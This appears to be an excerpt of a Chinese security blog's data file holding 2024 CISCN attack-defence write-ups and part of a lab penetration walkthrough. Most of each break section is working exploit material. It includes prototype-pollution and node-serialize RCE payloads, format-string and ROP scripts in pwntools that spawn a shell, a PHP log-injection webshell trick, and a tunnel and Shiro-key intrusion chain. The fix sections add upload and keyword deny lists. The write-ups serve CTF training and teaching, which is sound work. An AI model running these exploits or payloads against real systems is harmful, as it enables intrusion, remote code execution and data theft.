\"./uploads\";\nerror_reporting(0);\n$path = \"./uploads\";\n$content = file_get_contents($_FILES['myfile']['tmp_name']);\n$allow_content_type = array(\"image/png\");\n$type = $_FILES[\"myfile\"][\"type\"];\nif (!in_array($type, $allow_content_type)) {\n    die(\"只允许png哦!<br>\");\n}\n\n\n// 修改点\n$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".ini\",\".htaccess\");\n$file_name = trim($_FILES['myfile']['name']);\n\n$file_ext = strrchr($file_name, '.');\n$file_ext = strtolower($file_ext);\n$file_ext = str_ireplace('::$DATA', '', $file_ext);\n$file_ext = trim($file_ext);\n\nif (in_array($file_ext, $deny_ext)) {\n\tdie('此文件不允许上传!');\n}\n\nif (preg_match('/(php|script|xml|user|htaccess)/i', $content)) {\n    // echo \"匹配成功!\";\n    die('鼠鼠说你的内容不符合哦0-0');\n} else {\n    $file = $path . '/' . $_FILES['myfile']['name'];\necho $file;\n\nif (move_uploaded_file($_FILES['myfile']['tmp_name'], $file)) {\n        file_put_contents($file, $content);\n        echo 'Success!<br>';\n} else {\n        echo 'Error!<br>';\n}\n}\n?>\n\n\n<!---->\n\n```\n\n\n\n\n\n# web-粗心的程序员\n\n## break\n\n扫目录，得到`www.zip`\n\n```php\n<?php\nerror_reporting(0);\ninclude \"default_info_auto_recovery.php\";\nsession_start();\n$p = $_SERVER[\"HTTP_X_FORWARDED_FOR\"]?:$_SERVER[\"REMOTE_ADDR\"];\nif (preg_match(\"/\\?|php|:/i\",$p))\n{\n    die(\"\");\n}\n$time = date('Y-m-d h:i:s', time());\n$username = $_SESSION['username'];\n$id = $_SESSION['id'];\nif ($username && $id){\n    echo \"Hello,\".\"$username\";\n    $str = \"//登陆时间$time,$username $p\";\n    $str = str_replace(\"\\n\",\"\",$str);\n    file_put_contents(\"config.php\",file_get_contents(\"config.php\").$str);\n}else{\n    die(\"NO ACCESS\");\n}\n?>\n```\n\nhome.php中会写入登录日志`$str = \"//登陆时间$time,$username $p\";`\n\n用`?><? phpinfo(); //`截断注释输出phphinfo\n\n![](/img/wp/2024/2024ciscn-粗心的程序员-BREAK_1.png)\n\n\n或者写入一个换行后在xff中执行命令\n\n## fix\n\n对于写入日志的两个参数添加黑名单\n\nhome.php\n\n```php\n<?php\nerror_reporting(0);\ninclude \"default_info_auto_recovery.php\";\nsession_start();\n$p = $_SERVER[\"HTTP_X_FORWARDED_FOR\"]?:$_SERVER[\"REMOTE_ADDR\"];\n\n// 修改点1\n$blacklist = [\">\",\"<\",\";\",\"|\",\"//\",\"#\",\"php\",\"'\",\"=\"];\n$p = str_replace($blacklist,\"\",$p);\n\nif (preg_match(\"/\\?|php|\\>|:/i\",$p))\n{\n    die(\"\");\n}\n$time = date('Y-m-d h:i:s', time());\n$username = $_SESSION['username'];\n$id = $_SESSION['id'];\nif ($username && $id){\n    echo \"Hello,\".\"$username\";\n\n    // 修改点2\n    $blacklist = [\">\",\"<\",\";\",\"|\",\"//\",\"#\",\"?\"];\n    $username = str_replace($blacklist,\"\",$username);\n\n    $str = \"//登陆时间$time,$username $p\";\n    $str = str_replace(\"\\n\",\"\",$str);\n    file_put_contents(\"config.php\",file_get_contents(\"config.php\").$str);\n}else{\n    die(\"NO ACCESS\");\n}\n?>\n<br>\n<script type=\"text/javascript\" src=\"js/jquery-1.9.0.min.js\"></script>\n<script type=\"text/javascript\" src=\"js/jquery.base64.js\"></script>\n<script>\n ....\n</script>\n更改用户名<input type=\"text\" name=\"newusername\" id=\"newusername\" value=\"\">\n<button type=\"submit\" onclick=\"submitData()\" >更改</button>\n```\n\n\n# web-Polluted\n\n## break\n\n\n```python\nfrom flask import Flask, session, redirect, url_for,request,render_template\nimport os\nimport hashlib\nimport json\nimport re\n\ndef generate_random_md5():\n    random_string = os.urandom(16)\n    md5_hash = hashlib.md5(random_string)\n\n    return md5_hash.hexdigest()\ndef filter(user_input):\n    blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string']\n    for pattern in blacklisted_patterns:\n        if re.search(pattern, user_input, re.IGNORECASE):\n            return True\n    return False\ndef merge(src, dst):\n    # Recursive merge function\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\n\napp = Flask(__name__)\napp.secret_key = generate_random_md5()\n\nclass evil():\n    def __init__(self):\n        pass\n\n@app.route('/',methods=['POST'])\ndef index():\n    username = request.form.get('username')\n    password = request.form.get('password')\n    session[\"username\"] = username\n    session[\"password\"] = password\n    Evil = evil()\n    if request.data:\n        if filter(str(request.data)):\n            return \"NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~\"\n        else:\n            merge(json.loads(request.data), Evil)\n            return \"MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED\"\n    return render_template(\"index.html\")\n\n@app.route('/admin',methods=['POST', 'GET'])\ndef templates():\n    username = session.get(\"username\", None)\n    password = session.get(\"password\", None)\n    if username and password:\n        if username == \"adminer\" and password == app.secret_key:\n            return render_template(\"important.html\", flag=open(\"/flag\", \"rt\").read())\n        else:\n            return \"Unauthorized\"\n    else:\n        return f'Hello,  This is the POLLUTED page.'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0',debug=True, port=80)\n```\n\npython原型链污染secret_key\n\n```python\n{\n    \"__init__\": {\n        \"__globals__\": {\n            \"app\": {\n                \"secret_key\": \"dr0n111\"\n            }\n        }\n    }\n}\n```\n\n有关键字被过滤了，转成unicode绕过\n\n```python\n{\n    \"\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f\": {\n        \"\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\": {\n            \"\\u0061\\u0070\\u0070\": {\n                \"\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074\\u005f\\u006b\\u0065\\u0079\": \"dr0n111\"\n            }\n        }\n    }\n}\n```\n\n污染后伪造key登录\n\n```\npython flask_session_cookie_manager3.py encode -s \"dr0n111\" -t \"{'password':'dr0n111','username':'adminer'}\"\n```\n\n![](/img/wp/2024/2024ciscn-Polluted_break_1.png)\n\n\n登录后看到语法标识符不对，使用`variable_start_string`替换\n\n```python\n{\n    \"__init__\": {\n        \"__globals__\": {\n            \"app\": {\n                \"jinja_env\": {\n                    \"variable_start_string\": \"[%\",\n                    \"variable_end_string\": \"%]\"\n                }\n            }\n        }\n    }\n}\n```\n\n```python\n{\n    \"\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f\": {\n        \"\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\": {\n            \"\\u0061\\u0070\\u0070\": {\n                \"\\u006a\\u0069\\u006e\\u006a\\u0061\\u005f\\u0065\\u006e\\u0076\": {\n                    \"\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0074\\u0061\\u0072\\u0074\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\": \"[%\",\n                    \"\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006c\\u0065\\u005f\\u0065\\u006e\\u0064\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\": \"%]\"\n                }\n            }\n        }\n    }\n}\n```\n\n\n因为缓存的原因，先污染在访问即可\n\n![](/img/wp/2024/2024ciscn-Polluted_break_2.png)\n\n\n## fix\n\n增加黑名单\n\n```python\ndef filter(user_input):\n    blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string', '005f', '0074', '006c', '[%']\n    for pattern in blacklisted_patterns:\n        if re.search(pattern, user_input, re.IGNORECASE):\n            return True\n    return False\n```\n\n\n\n# web-bigfish\n\n\n## break\n\n\n扫目录得到`/admin`和`/login`\n\n访问admin会自动跳转到login，简单修改cookie就能直接登录\n\n数据储存位置可以穿越目录，读取`fish.js`\n\n```js\nconst express = require('express');\nconst path = require('path');\nconst fs = require('fs');\nconst cookieParser = require('cookie-parser');\nconst bodyParser = require('body-parser');\nconst serialize = require('node-serialize');\nconst schedule = require('node-schedule');\n\n// Change working directory to /srv\nprocess.chdir('/srv');\n\n\nlet rule1 = new schedule.RecurrenceRule();\nrule1.minute = [0, 3, 6 , 9, 12, 15, 18, 21, 24, 27, 30, 33, 36, 39, 42, 45, 48, 51, 54, 57];\n\n// 定时清除\nlet job1 = schedule.scheduleJob(rule1, () => {\n\tfs.writeFile('data.html',\"#获取的数据信息\\n\",function(error){\n\t\tconsole.log(\"wriet error\")\n\t});\n});\n\n\nconst app = express();\n\napp.engine('html',require('express-art-template'))\n\napp.use(express.static('public'));\napp.use(cookieParser());\napp.use(bodyParser.json())\napp.use(bodyParser.urlencoded({extended: false}))\n\n\ndata_path = \"data.html\";\n\n// Middleware to set default cookies for /admin route\nfunction setDefaultAdminCookies(req, res, next) {\n    if (!req.cookies.username) {\n        res.cookie('username', 'normal');\n    }\n    if (!req.cookies.is_admin) {\n        res.cookie('is_admin', 'false');\n    }\n    next();\n}\n\n//主页\napp.get('/', function(req, res) {\n\tres.sendFile(path.join(__dirname, 'public/index.html'));\n});\n\napp.post('/',function(req, res){\n\tfs.appendFile('data.html',JSON.stringify(req.body)+\"\\n\",function(error){\n\t\tconsole.log(req.body)\n\t});\n\tres.sendFile(path.join(__dirname, 'public/index.html'));\n});\n\n\n//后台管理\napp.get('/admin', setDefaultAdminCookies, function(req, res) {\n\tif(req.cookies.username !== \"admin\" || req.cookies.is_admin !== \"true\"){\n\t\tres.redirect('login');\n\t}else if(req.cookies.username === \"admin\" && req.cookies.is_admin === \"true\"){\n\t\tres.render('admin.html',{\n            datadir : data_path\n        });\n\t}\n});\n\napp.post('/admin', setDefaultAdminCookies, function(req, res) {\n\tif(req.cookies.username !== \"admin\" || req.cookies.is_admin !== \"true\"){\n\t\tres.redirect('login');\n\t}else if(req.cookies.username === \"admin\" && req.cookies.is_admin === \"true\"){\n\t\tif(req.body.newname){\n\t\t\tdata_path = req.body.newname;\n\t\t\tres.redirect('admin');\n\t\t}else{\n\t\t\tres.redirect('admin');\n\t\t}\n\t}\n});\n\n\n//已弃用的登录\napp.get('/login', function(req, res) {\n\tres.sendFile(path.join(__dirname, 'public/login.html'));\n});\n\napp.post('/login', function(req, res) {\n\tif(req.cookies.profile){\n        var str = new Buffer(req.cookies.profile, 'base64').toString();\n        var obj = serialize.unserialize(str);\n\t\tif (obj.username) {\n            if (escape(obj.username) === \"admin\") {\n\t\t\t\tres.send(\"Hello World\");\n\t\t\t}\n\t\t}\n\t}else{\n\t\tres.sendFile(path.join(__dirname, 'public/data'));\n\t}\n});\n\n//QQ\napp.get('/qq', function(req, res) {\n\tif(req.cookies.username !== \"admin\" || req.cookies.is_admin !== \"true\"){\n\t\tres.redirect('login');\n\t}else if(req.cookies.username === \"admin\" && req.cookies.is_admin === \"true\"){\n\t\tres.sendFile(path.join(__dirname, data_path));\n\t}\n});\n\n\napp.listen(80, '0.0.0.0');\n```\n\n在login的时候执行了`serialize.unserialize(str)`，可以打nodejs反序列化\n\n```\n{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('cat /this_is_your_ffflagg > /tmp/1.txt',function(error,stdout,stderr) {console.log(stdout)});}()\"}\n```\n\n\n利用目录穿越拿到flag\n\n\n\n\n\n## fix\n\n提示：应修尽修，xss\n\n没有修复成功\n\n\n\n# pwn-ezwp\n\n## break\n\n\n非预期：phpinfo中直接搜flag\n\n预期解：\n\nphp.ini里可以看到引用了myphp.so\n\n```php\nextension=/home/myphp.so\n```\n\nida分析\n\n进入`get_module`函数，通过扩展函数表，可以看到`myphp.so`扩展导出了三个函数: myphp_test1,myphp_test2,phppwn\n\n![](/img/wp/2024/2024ciscn-ezwp_break_1.png)\n\n\n进入`phppwn`，发现会验证密钥后读取flag输出\n\n\n但是这里`len`的类型是`unsigned __int8`，所以`len=strlen(arg)&0xff`。同时密钥长度32，限制长度24，可以使用整数溢出进行绕过\n\n\n![](/img/wp/2024/2024ciscn-ezwp_break_2.png)\n\n\n\nexp\n\n字符串长度&0xff<0x18 即可\n\n```php\nhVymkNmp0NM0NcYCswNtFbUZuG1GXbwUaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n```\n\n加上无字母rce\n\n```php\nphppwn(\"hVymkNmp0NM0NcYCswNtFbUZuG1GXbwUaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\");\n```\n\n```php\n(~%8F%97%8F%8F%88%91)(~%97%A9%86%92%94%B1%92%8F%CF%B1%B2%CF%B1%9C%A6%BC%8C%88%B1%8B%B9%9D%AA%A5%8A%B8%CE%B8%A7%9D%88%AA%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E%9E);\n```\n\n\n\n## fix\n\n\n应该是需要修改字符串长度比较类型为长整型\n\n\n\n# pwn-cJSON\n\n## break\n\n在delete功能中存在格式化字符串，利用格式化字符串可以获取shell\n\n![](/img/wp/2024/2024ciscn-cJSON-BREAK_1.png)\n\n\n```python\nfrom pwn import *\nimport json\n\ndef all(name):\n    p.sendlineafter(b\">\",b'1')\n    p.sendlineafter(b'name:',name)\n\ndef get(name):\n    p.sendlineafter(b'>',b'2')\n    p.sendlineafter(b'name:',name)\n\ndef edit(name,data):\n    p.sendlineafter(b'>',b'3')\n    p.sendlineafter(b'name:',name)\n    p.sendlineafter(b'len:',str(len(data)).encode())\n    p.sendlineafter(b'data:',data)\n\ndef free(name):\n    p.sendlineafter(b'>',b'4')\n    p.sendlineafter(b'name:',name)\n#p=process(\"./pwn\")\np=remote(\"10.1.123.16\",9999)\n#gdb.attach(p,'bp $rebase(0x6b3b)')\nlibc=ELF(\"./libc.so.6\")\n#libc=ELF(\"./libc\")\ne=ELF(\"./pwn\")\noffset=20\ncode={\"%25$p\":1}\npayload=json.dumps(code)\np.sendlineafter(b\"size: \",str(len(payload)).encode())\np.sendlineafter(b'Json:',payload.encode())\nfree(\"%27$p\")\n\np.readuntil('[')\nd=int(p.readuntil(']',drop=1),16)\nlibc.address=d-0x24083\n#libc.address=d-0x29d90\nfree(\"%11$p\")\np.readuntil('[')\nd=int(p.readuntil(']',drop=1),16)\ne.address=d-0x6b04\n\nfree(\"%10$p\")\np.readuntil('[')\nd=int(p.readuntil(']',drop=1),16)\nmainstack=d+8\nstack=d-0x78\nbin_sh=next(libc.search(b'/bin/sh\\x00'))\nsystem=libc.sym['system']\nrdi=e.address+0x0000000000006ba3\nret=rdi+1\nprint(hex(mainstack))\nprint(hex(stack))\nprint(hex(libc.address))\nprint(hex(rdi))\nprint(hex(ret))\npayload=p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)\nfor i,v in enumerate(payload):\n    if v==0:\n        data=\"%22$hhn\"\n    else:\n        data=(\"%\"+str(v)+\"c%\"+\"22$hhn\")\n    data=data.encode().ljust(16,b'a')+p64(mainstack+i)\n    print(data)\n    free(data)\nretaddr=e.address+0x6b3a\nfree((\"%\"+str(retaddr&0xffff)+\"c%\"+\"22$hn\").encode().ljust(16,b'a')+p64(stack))\n\npause()\np.interactive()\n```\n\n## fix\n\n将delete功能中的printf函数修改为puts\n\n![](/img/wp/2024/2024ciscn-cJS0N-FIX_1.png)\n\n在edit功能中可能存在栈溢出，修改memcpy的第三个参数\n\n![](/img/wp/2024/2024ciscn-cJS0N-FIX_2.png)\n\n\n\n\n# pwn-baby_jit\n\n## break\n\nshellcode中有8字节是自定义的,利用这8字节进行二次写，实现orw\n\n```python\nfrom pwn import *\ncontext.arch='amd64'\n\ndef exec():\n    pass\n\nshellcode=\"\"\"xor rdi,rdi\nxchg rsi,rdx\nsyscall\"\"\"\n\np=remote(\"10.1.123.17\",9999)\np.sendlineafter('>>','1')\np.sendline(\"add \"+str(u64(asm(shellcode))))\n\nfor i in range(0x20):\n    p.sendlineafter('>>','1')\n    p.sendline(\"add \"+str(u64(asm(shellcode))))\n\np.sendlineafter('>>','2')\np.sendlineafter('offset?','0.2')\n\nshellcode=shellcraft.open(\"flag\")+shellcraft.read(3,0x100000+0x100,0x100)+shellcraft.write(1,0x100000+0x100,0x100)\np.send(b'a'*0x8+asm(shellcode))\np.interactive()\n```\n\n## fix\n\n尝试了 修改指令单位大小，不使用浮点数进行偏移 没有防御成功\n\n\n\n# pwn-printf-master\n\n## break\n\n利用栈中指向args和envs的指针数据修改printf函数返回地址，进行多次格式化字符串，最终修改printf的返回地址为gadget获得shell\n\n```python\nfrom pwn import *\nimport random\n#context.log_level='debug'\ndef pwn(p):\n    libc=ELF(\"./libc-2.31.so\")\n    gadget=0xe6af1\n    print(hex(gadget))\n    gdb.attach(p,'bp $rebase(0x1635)')\n    p.sendlineafter(b\">>>\",b'1')\n    p.readuntil('gift:')\n    stack=int(p.readline(),16)\n    print_stack=stack-0x18\n    print(hex(print_stack))\n    payload=\"%c\"*14\n    payload+=\"%p\"+\"%\"+str(print_stack-14-14)+'c'+'%hn'\n    data=0xa9\n    subdata=(print_stack+26)&0xff\n    data=data+0x100-subdata\n    payload+=\"%c\"*26+\"%\"+str(data)+'c'+\"%hhn\"\n#    p.sendline('%p '*80)\n    p.sendlineafter('name?',payload)\n    p.readuntil('0x')\n    libc.address=int(p.read(12),16)-0x270b3\n    gadget=libc.address+gadget #3601\n    #libc.address=int(p.read(12),16)-0x24083\n    print(hex(libc.address))\n#    p.sendline('%p '*60)\n#    p.interactive()\n    print_stack=print_stack-0x30\n\n\n    data=print_stack-0x30\n    payload='%c'*8+'%'+str(data-8)+'c'+'%hn'\n\n    data=print_stack\n    subdata=print_stack-0x30+11\n    data=data+0x10000-subdata\n    payload+='%c'*11+'%'+str(data)+'c'+'%hn'\n\n\n    data=print_stack+4-0x30\n    subdata=(print_stack+14)&0xffff\n    data=data+0x10000-subdata\n    payload+=\"%c\"*4+\"%c\"*10+\"%\"+str(data)+'c'+\"%hn\"\n    \n    data=0xa9\n    subdata=(print_stack+4+10-0x30)&0xff\n    data=data+0x100-subdata\n    payload+=\"%c\"*10+\"%\"+str(data)+'c'+'%hhn'\n    \n    print(payload)\n    print(hex(print_stack))\n    print(hex(gadget))\n    print(len(payload))\n    p.sendlineafter(\"name?\",payload)\n    pause()\n\n    print_stack-=0x30\n    data=gadget&0xffff\n    subdata=20\n    data=data+0x10000-subdata\n    payload=\"%c\"*20+\"%\"+str(data)+\"c\"+\"%hn\"\n\n    data=print_stack+2\n    subdata=(gadget+5)&0xffff\n    data=data+0x10000-subdata\n    payload+=\"%c\"*5+\"%\"+str(data)+\"c\"+\"%hn\"\n\n    data=(gadget>>16)&0xffff\n    subdata=(print_stack+2+26)&0xffff\n    data=data+0x10000-subdata\n\n    payload+=\"%c\"*26+'%'+str(data)+'c'+\"%hn\"\n\n    data=(gadget>>32)&0xffff\n    subdata=(gadget>>16)&0xffff\n    data=data+0x10000-subdata\n    payload+=\"%\"+str(data)+\"c\"+\"%hn\"\n    print(payload)\n    info(\"thrid\")\n    p.sendlineafter(\"name?\",payload)\n    p.interactive()\n#    pause()\n\np=process(\"./pwn1\")\npwn(p)\n\nwhile True:\n    break\n    try:\n        #p=remote(\"10.1.123.23\",9999)\n        p=process(\"./pwn1\")\n        gdb.attach(p,'bp $rebase(0x1635)')\n        pwn(p)\n    except:\n        pass\n```\n\n## fix\n\n\n在输出时使用了printf函数，修改为使用puts函数进行输出\n\n![](/img/wp/2024/2024ciscn-printf-master-FIX_1.png)\n","tags":["wp","awdp","ciscn","2024竞赛"],"categories":["wp"]},{"title":"春秋云境 GreatWall(第一届长城杯半决赛渗透题)","url":"/posts/f249db01/","content":"\n# ThinkPHP (172.28.23.17)\n\n先扫描端口，发现开放了两个web服务\n\n![](/img/内网/ichunqiu/GreatWall-1.png)\n\n8080是一个后台登录框，版本是`ThinkPHP V5.0.23`\n\n![](/img/内网/ichunqiu/GreatWall-2.png)\n\n\n直接用tp5的nday打\n\n写入shell后根目录有`flag1`\n\n![](/img/内网/ichunqiu/GreatWall-3.png)\n\n\n然后上传fscan开始扫内网\n\n```bash\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:04:4a:03 brd ff:ff:ff:ff:ff:ff\n    inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0\n       valid_lft 315357428sec preferred_lft 315357428sec\n    inet6 fe80::216:3eff:fe04:4a03/64 scope link \n       valid_lft forever preferred_lft forever\n```\n\n发现存活主机如下\n\n```\n172.28.23.26\n172.28.23.33\n```\n\n![](/img/内网/ichunqiu/GreatWall-4.png)\n\n\n# 第一层内网\n\n## 建立代理\n\n通过Neo-reGeorg上传一个tunnel.php\n\n然后本地建立连接，转发到本地的6666端口\n\n`python neoreg.py -k dr0n1 -p 6666 -u http://8.130.36.152:8080/tunnel.php`\n\n\n然后使用proxifier或者SwitchyOmega等代理\n\n\n## 智联科技 ERP (172.28.23.33)\n\n开放了8080端口，访问是 智联科技 ERP 后台登陆\n\n扫下目录\n\n`python dirsearch.py -u http://172.28.23.33:8080/ --proxy socks5://127.0.0.1:6666`\n\n显然是Shiro框架+heapdump泄露\n\n![](/img/内网/ichunqiu/GreatWall-5.png)\n\n使用`JDumpSpider`分析heapdump，拿到ShiroKey\n\n```\n===========================================\nCookieRememberMeManager(ShiroKey)\n-------------\nalgMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES\n\n===========================================\n```\n\n\n注入内存马后连接shell\n\n![](/img/内网/ichunqiu/GreatWall-6.png)\n\n\n没找到flag，用户是ops01，应该是要提权\n\n在/home/ops01/中有HashNote文件，开放了59696端口\n\n![](/img/内网/ichunqiu/GreatWall-24.png)\n\n\n\n分析HashNote文件\n\n\n\n首先调用了`sub_40501E()`进行身份验证，密码为`freep@ssw0rd:3`\n\n\n\n选项1调用了`sub_404924()`\n\n\n输入key后调用了`sub_40482C()`，生成hash作为索引，返回的范围是0-126\n\n![](/img/内网/ichunqiu/GreatWall-26.png)\n\n\n因为在重复判断时没有对索引进行验证，存在数组越界\n\n![](/img/内网/ichunqiu/GreatWall-25.png)\n\n\n\n\n\n选项2调用了`sub_404B7A()`\n\n与1同样，没有对索引验证，可以构造data，实现任意地址读\n\n![](/img/内网/ichunqiu/GreatWall-27.png)\n\n\n\n\n选项3调用了`sub_404D2D()`\n\n与2一样，输出变成了写入，可以任意地址写\n\n![](/img/内网/ichunqiu/GreatWall-28.png)\n\n\n\n因为username的地址在数组之后，所以越界后数组可以索引到username\n\n![](/img/内网/ichunqiu/GreatWall-29.png)\n\n\n\n先构造两个同样hash不同key的数据\n\n```python\ndef add(key,data='b'):\n    p.sendlineafter(b'Option:',b'1')\n    p.sendlineafter(b'Key:',key)\n    p.sendlineafter(b'Data:',data)\n\nadd(b'\\x30'*1+b'\\x31'+b'\\x44',b'test')\nadd(b'\\x30'*2+b'\\x31'+b'\\x44',b'test')\n```\n\n\n然后再username中伪造数据，获取栈的地址\n\n```python\nusername=0x5dc980\nstack=0x5e4fa8\nukey=b'\\x30'*5+b'\\x31'+b'\\x44'\n\nfake_chunk=flat({\n    0:username+0x10,\n    0x10:[username+0x20,len(ukey),\\\n        ukey,0],\n    0x30:[stack,0x10]\n    },filler=b'\\x00')\n```\n\n\n拿到地址后就可以向栈中写入rop链\n\n\nexp\n\n```python\nfrom pwn import *\ncontext.arch='amd64'\n\ndef add(key,data='b'):\n    p.sendlineafter(b'Option:',b'1')\n    p.sendlineafter(b'Key:',key)\n    p.sendlineafter(b'Data:',data)\n\ndef show(key):\n    p.sendlineafter(b'Option:',b'2')\n    p.sendlineafter(b\"Key: \",key);\n\ndef edit(key,data):\n    p.sendlineafter(b'Option:',b'3')\n    p.sendlineafter(b'Key:',key)\n    p.sendlineafter(b'Data:',data)\n\ndef name(username):\n    p.sendlineafter(b'Option:',b'4')\n    p.sendlineafter(b'name:',username)\n\n\np = remote('172.28.23.33', 59696)\n# p = process('./HashNote')\n\n\nusername=0x5dc980\nstack=0x5e4fa8\nukey=b'\\x30'*5+b'\\x31'+b'\\x44'\n\nfake_chunk=flat({\n    0:username+0x10,\n    0x10:[username+0x20,len(ukey),\\\n        ukey,0],\n    0x30:[stack,0x10]\n    },filler=b'\\x00')\n\np.sendlineafter(b'name',fake_chunk)\np.sendlineafter(b'word','freep@ssw0rd:3')\n\nadd(b'\\x30'*1+b'\\x31'+b'\\x44',b'test')   # 126\nadd(b'\\x30'*2+b'\\x31'+b'\\x44',b'test')   # 127\n\n\nshow(ukey)\nmain_ret=u64(p.read(8))-0x1e0\n\n\n\n\nrdi=0x0000000000405e7c # pop rdi ; ret\nrsi=0x000000000040974f # pop rsi ; ret\nrdx=0x000000000053514b # pop rdx ; pop rbx ; ret\nrax=0x00000000004206ba # pop rax ; ret\nsyscall=0x00000000004560c6 # syscall\n\nfake_chunk=flat({\n    0:username+0x20,\n    0x20:[username+0x30,len(ukey),\\\n        ukey,0],\n    0x40:[main_ret,0x100,b'/bin/sh\\x00']\n    },filler=b'\\x00')\n\nname(fake_chunk.ljust(0x80,b'\\x00'))\n\n\npayload=flat([\n    rdi,username+0x50,\n    rsi,0,\n    rdx,0,0,\n    rax,0x3b,\n    syscall\n    ])\n\np.sendlineafter(b'Option:',b'3')\np.sendlineafter(b'Key:',ukey)\np.sendline(payload)\np.sendlineafter(b'Option:',b'9')\np.interactive()\n```\n\n在`/root/flag_RaYz1/f1ag03.txt`拿到flag3\n\n![](/img/内网/ichunqiu/GreatWall-7.png)\n\n\n有两张网卡\n\n```bash\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:03:cb:48 brd ff:ff:ff:ff:ff:ff\n    inet 172.28.23.33/16 brd 172.28.255.255 scope global dynamic eth0\n       valid_lft 315357178sec preferred_lft 315357178sec\n    inet6 fe80::216:3eff:fe03:cb48/64 scope link \n       valid_lft forever preferred_lft forever\n3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> 